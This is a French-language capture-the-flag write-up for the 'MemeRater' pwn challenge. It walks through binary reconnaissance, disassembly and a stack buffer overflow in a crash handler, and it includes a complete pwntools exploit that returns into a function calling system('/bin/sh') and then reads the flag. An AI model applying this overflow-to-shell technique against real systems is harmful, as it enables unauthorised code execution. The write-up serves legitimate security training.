# MemeRater — writeup simple

**Catégorie :** pwn · **Service :** `nc memerater.zerodays.events 5222`

**Chaîne d’exploit (résumé) :** une première note énorme → **SIGSEGV** → handler **`crash_logger`** → **`read(256)`** dans **64** octets → overflow → **`ret` @ 0x40101a** → **`memer` @ 0x4011a6** → `system("/bin/sh")`.

---
![Liste des fonctions : `memer`, `crash_logger`, `main`, `system@plt`, `read@plt`, …](capture/chalenge.png)


## 1. Reconnaissance

### `file`

```bash
file ./meme_rater
```

![Résultat de `file` : ELF64, non strippé, etc.](capture/file.png)

### `checksec`

```bash
checksec --file=./meme_rater
```

![Protections : pas de canary, pas de PIE, NX activé](capture/checksec.png)

*(Pas de canary et pas de PIE → adresses stables ; NX → pas de shellcode exécutable sur la pile.)*

---

## 2. Symboles et PLT (pwndbg)

Lister les fonctions utiles et les imports **`system`**, **`read`**, **`scanf`** :

```text
gdb ./meme_rater
pwndbg> info functions
```



---

## 3. Cible shell : `memer`

### Désassemblage pwndbg

```text
pwndbg> disassemble memer
```

```text
Dump of assembler code for function memer:
   0x00000000004011a6 <+0>:     push   rbp
   0x00000000004011a7 <+1>:     mov    rbp,rsp
   0x00000000004011aa <+4>:     lea    rax,[rip+0xf59]        # 0x40210a
   0x00000000004011b1 <+11>:    mov    rdi,rax
   0x00000000004011b4 <+14>:    call   0x401050 <system@plt>
   ...
End of assembler dump.
```

Vérifier la chaîne passée à `rdi` :

```text
pwndbg> x/s 0x40210a
0x40210a: "/bin/sh"
```

**Erreur classique :** `x/s 0x4021a` → mauvaise adresse (tronquée ou incomplète). Utiliser l’adresse du commentaire **`lea`** : **`0x40210a`**.

### Vue statique (Ghidra) — optionnel

Même logique : repérer **`memer`**, **`system`**, la chaîne **`/bin/sh`**.

![Analyse statique dans Ghidra (fonctions / strings)](capture/ghidra.png)

---

## 4. Overflow : `crash_logger`

### Désassemblage

```text
pwndbg> disassemble crash_logger
```

```text
   ...
   0x00000000004011f9 <+61>:    lea    rax,[rbp-0x40]
   0x00000000004011fd <+65>:    mov    edx,0x100
   0x0000000000401202 <+70>:    mov    rsi,rax
   0x0000000000401205 <+73>:    mov    edi,0x0
   0x000000000040120a <+78>:    call   0x401080 <read@plt>
   0x000000000040120f <+83>:    lea    rax,[rip+0xf72]        # 0x402188
   ...
   0x000000000040122e <+114>:   leave
   0x000000000040122f <+115>:   ret
```

- Tampon **`[rbp-0x40]`** → **64** octets.
- **`read`** demande **0x100** octets → **stack buffer overflow** sur la pile du handler.

**Débogage :** `break *0x40120f` (juste après `read`), puis `run < <(python3 gen.py)` : phase 1 = six notes (première énorme), phase 2 = **`cyclic`** pour mesurer l’offset jusqu’au **`RIP`** (**72** octets = 64 + saved `rbp`).

### Script `gen.py` (stdin en deux phases)


---

## 5. Gadget `ret`

```bash
ROPgadget --binary ./meme_rater | grep ': ret$'
```

```text
0x000000000040101a : ret
```

Un seul **`ret`** suffit pour l’alignement de pile avant l’appel à **`system`** dans **`memer`**.

---

## 6. Payload

| Élément | Valeur |
|---------|--------|
| Padding | 64 octets |
| `saved rbp` | `0` |
| Gadget | `0x40101a` (`ret`) |
| Cible | `0x4011a6` (`memer`) |

---

## 7. Exploit (pwntools)

Code complet (copie aussi dans [`exploit.py`](./exploit.py)) :

```python
#!/usr/bin/env python3
"""
MemeRater pwn:
1. La vérification 1–100 est bogueuse : tout entier positif passe ; le 1er devient un index dans tier_table -> OOB -> SIGSEGV.
2. crash_logger() fait read(0, buf, 0x100) dans 64 octets -> overflow.
3. memer() appelle system("/bin/sh") @ 0x4011a6. Un gadget ret (0x40101a) avant corrige l'alignement pour libc system.
"""
from pwn import *

context.arch = "amd64"
context.log_level = "info"

BINARY = "./meme_rater"
RET = 0x40101A
MEMER = 0x4011A6


def exploit(io):
    huge = 0x7FFFFFFF
    for i in range(6):
        io.sendlineafter(b": ", str(huge if i == 0 else 50).encode())

    io.recvuntil(b"fix it..")
    # buf 64 @ rbp-0x40, puis saved rbp, puis ret
    payload = b"A" * 64 + p64(0) + p64(RET) + p64(MEMER)
    io.send(payload)

    io.recvuntil(b"ok\n", timeout=3)
    io.sendline(b"cat flag* 2>/dev/null || cat flag.txt 2>/dev/null || ls -la")
    io.interactive()


def main():
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "local":
        io = process(BINARY)
    else:
        io = remote("memerater.zerodays.events", 5222)

    exploit(io)


if __name__ == "__main__":
    main()
```

Lancement :

```bash
python3 exploit.py
# test local :
python3 exploit.py local
```


---

## 8. Flag

```text
ZeroDays{…}
```
